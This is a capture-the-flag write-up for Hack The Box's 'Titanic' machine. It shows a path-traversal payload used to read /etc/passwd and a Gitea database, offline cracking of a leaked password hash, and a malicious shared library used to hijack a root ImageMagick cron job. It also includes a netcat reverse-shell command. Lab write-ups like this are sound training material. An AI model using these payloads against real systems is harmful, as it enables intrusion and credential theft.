Tags: #Linux/Ubuntu #Easy #Apache #Hidden-Subdomains #Sensitive-Data-Exposure #LFI #Weak-Passwords #Outdated-software #Cronjobs #Shared-Library-Hijacking
# **Nmap Results**

```text
Nmap scan report for 10.10.11.55
Host is up (0.097s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://titanic.htb/
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.73 seconds
```
<br>
<br>

# **Service Enumeration**
Nmap scan results show that there's only 2 ports open: an Apache web server listening on port 80 and SSH on port 22. It discovered that the site has a hostname of **titanic.htb**, so we'll add that to our `/etc/hosts` file.

Here's what we see when we navigate there in our browser:

![[Pasted image 20250216195122.png]]

Seems to be an online trip reservation site for the titanic. We can take a look at the form for booking a trip, but I was running `ffuf` in the background to see if there were any hidden subdomains, and sure enough, we found **dev.titanic.htb**, so we're going to add that to our `/etc/hosts` file as well so we can access it. 

It looks like Gitea is set up on this part of the site:

![[Pasted image 20250216200010.png]]

Maybe there's a public repository that discloses sensitive info. Let's take a look around in the "Explore" tab:

![[Pasted image 20250216200244.png]]

We find 2 repositories of interest, **docker-config** and **flask-app**. 

Looking at docker-config, there's a subfolder named **mysql** with a file called **docker-compose.yml**, and it reveals some valuable info about their backend database:

```yaml
version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always

```

The most valuable piece of info here is the root password, which is `MySQLP@$$w0rd`. This could be useful later.

Taking a look at the flask-app repo, we find the site's `app.py` file. Its contents are written below:

```python
from flask import Flask, request, jsonify, send_file, render_template, redirect, url_for, Response
import os
import json
from uuid import uuid4

app = Flask(__name__)

TICKETS_DIR = "tickets"

if not os.path.exists(TICKETS_DIR):
    os.makedirs(TICKETS_DIR)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/book', methods=['POST'])
def book_ticket():
    data = {
        "name": request.form['name'],
        "email": request.form['email'],
        "phone": request.form['phone'],
        "date": request.form['date'],
        "cabin": request.form['cabin']
    }

    ticket_id = str(uuid4())
    json_filename = f"{ticket_id}.json"
    json_filepath = os.path.join(TICKETS_DIR, json_filename)

    with open(json_filepath, 'w') as json_file:
        json.dump(data, json_file)

    return redirect(url_for('download_ticket', ticket=json_filename))

@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400

    json_filepath = os.path.join(TICKETS_DIR, ticket)

    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
    else:
        return jsonify({"error": "Ticket not found"}), 404

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

The form for booking doesn't seem to be vulnerable to any kind of command injection, as there are no `eval` or `exec` functions. However if we take a look at the download page, we see that it requires a **ticket** parameter. There is no input sanitization of any sort for the ticket variable, and its value is passed right to the following line:

`json_filepath = os.path.join(TICKETS_DIR, ticket)`

This line combines the path specified in **TICKETS_DIR** and our input which is saved in the **ticket** variable. 

Then, if that path exists, it will send it to the user. There are no checks, not even for a file type or if the requested file is outside of the TICKETS_DIR directory. 

This means that this code is vulnerable to LFI. We need to craft a request to the **/download** page and specify the file we want in the ticket parameter, like **/etc/passwd**. We can use `curl` to achieve this. Our command will look like this:

`curl http://titanic.htb/download?ticket=../../../../../../etc/passwd`

Output of the command:

![[Pasted image 20250216205712.png]]

We successfully obtained the /etc/passwd file, telling us that there are only 2 users with interactive shells, root and developer. Now let's see if we can get a more sensitive file that'll help with exploitation.
<br>
<br>
# **Exploitation**
## **Initial Access**
In `docker-config/gitea/docker-compose.yml` , we see that gitea's data directory is located in **/home/developer/gitea/data**. We want to find gitea's database "gitea.db", which stores everything related to the app like repositories and its contents, access control rules, but most importantly, users and their passwords. 

The docs say that it's located within the data directory, so i tried passing **/home/developer/gitea/data/gitea.db** to the ticket parameter but the file doesn't exist. However, I did some guesswork and found that the path was actually **data/gitea/gitea.db**.

So now we have the SQLite database, let's take a look at it. Out of all the tables that are listed, **user** is the most interesting one. We want to view how its defined, so we'll run `.schema user`:

![[Pasted image 20250216225639.png]]

`name` and `passwd` are the columns we want, so we'll run `SELECT name, passwd FROM user;`

![[Pasted image 20250216225916.png]]

There's developer's password hash. Unfortunately hashes.com was unable to identify the hash type, but there's another column in the table's schema called `passwd_hash_algo`, that tells us the hashing algorithm used to hash the password. Now if we run `SELECT name, passwd, passwd_hash_algo FROM user;`, we get the following:

![[Pasted image 20250216231623.png]]

All passwords are hashed using PBKDF2 and have gone through 50,000 iterations of the algorithm. Knowing that passwords hashed in this format always have a salt, there must be a column that contains the salt for each user's password as well. Looking back at the schema, we find a column "salt", so we'll modify our query once more like so: `SELECT name, passwd, passwd_hash_algo FROM user WHERE id=2;` (the WHERE clause gives us just developer's info, we don't need anything else):

![[Pasted image 20250216235519.png]]

Gitea hashes the salt value using SHA-256, so when we pass all of this to hashcat, we'll use the mode 10900, which corresponds to PBKDF2-HMAC-SHA256. 

Before we start cracking, we have to format our hash file correctly. On Hashcat's example hashes page, if we scroll to mode 10900, the format should be as follows:

![[Pasted image 20250218175941.png]]

We need to specify the number of iterations (50000), base64 encoded salt, and base64 encoded hash. The hashes in the database are stored as hex. It's not plain ASCII, so attempting to convert them directly to base64 without converting to raw bytes first will result in hashcat looking at a completely different hash. 

After running hashcat against our hashfile and stepping through the passwords in rockyou.txt, it found developer's password to be just **25282528**. 

Now let's try and SSH using these credentials:

![[Pasted image 20250218183457.png]]

And there we go. Moving on to getting root. 
<br>
<br>
# **Privilege Escalation**  
In the `/opt` directory, there were 3 folders: **app**, **containerd**, and **scripts**. The app folder was just the source code of the web page we found initially and we don't have any permissions over containerd. However, within **scripts**, there is a bash script with the following code:

```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

This script clears the file "metadata.log", finds all jpg files within `/opt/app/static/assets/images/`, and passes the output to `magick identify` to collect metadata and store it in the metadata.log file. 

This code seems to be performing maintenance tasks, so there's a good chance it is executed every few minutes or so. Since I didn't find any cron jobs under developer, I thought root might have had one. To test this, we can continuously monitor the **metadata.log** file using `tail -f` and see if any changes are made. After waiting a while, we get the following output:

![[Pasted image 20250315152642.png]]

Line 2 of the above script executes the `truncate` command to clear metadata.log. In the output here, `tail` tells me that the file was truncated, meaning that root must have a cron job. Given this, that would mean that `magick` would also be executed with root privileges.

After running `magick -version`, we are told that the version is `7.1.1-35`. Looking online for a potential exploit, I found [a github page](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8) detailing an arbitrary code execution vulnerability within that specific version of the program. 

Essentially, the problem lies within the LD_LIBRARY_PATH environment variable. This variable tells the linker to look for shared libraries in the paths specified there first before looking in default locations like `/usr/lib`. Because it is set incorrectly, the variable points to the current working directory, meaning an attacker can create malicious .so files and have the binary execute them when it runs. 

The article also gives us the following command to create the malicious .so file:

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("id");
    exit(0);
}
EOF
```

Let's run `tail -f metadata.log` again to see how this new .so file affects the log. After waiting a while, we get:

![[Pasted image 20250315184523.png]]

Great, so we know that our library worked. Now to get a reverse shell, we change the command to `busybox nc 10.10.14.9 9001 -e sh` and wait until the crontab executes once more:

![[Pasted image 20250315185809.png]]

That's it. We have rooted the box. 
<br>
<br>
# Skills Learned
* The PBKDF2 hashing algorithm outputs the result in binary data, not hex. There are many other algorithms that do this, and the common standard practice for developers is to convert it into hex for storage. When stealing hashes of this format, and you need to encode it to base64 or some other format, make sure to **convert** the hash to **raw bytes** first, or find an online converter that can convert straight from hex
* `tail -f <file>` **monitors how a file changes over time** (e.g log files). If you don't find any interesting cron jobs, but you see an interesting **script** that seems to perform maintenance tasks (or if you find unusual changes within a directory or file you haven't made), you should **inspect** its contents to find out if it **modifies** any files you have read permissions over, then run the command on that file to **track changes**.
* `LD_LIBRARY_PATH` is an environment variable that tells the dynamic linker where to look for shared libraries before searching in default locations like `/usr/lib`. **Shared library hijacking** is a vulnerability that occurs when an application improperly sets this variable, allowing an attacker to modify the search order for .so files to prioritize a location of their choosing that includes a malicious library.
	* This is similar to **Path injection**, where an attacker injects a path into the **$PATH** environment variable, ensuring their malicious file is executed before the legitimate one. 
<br>
<br>
# Proof of Pwn
https://www.hackthebox.com/achievement/machine/391579/648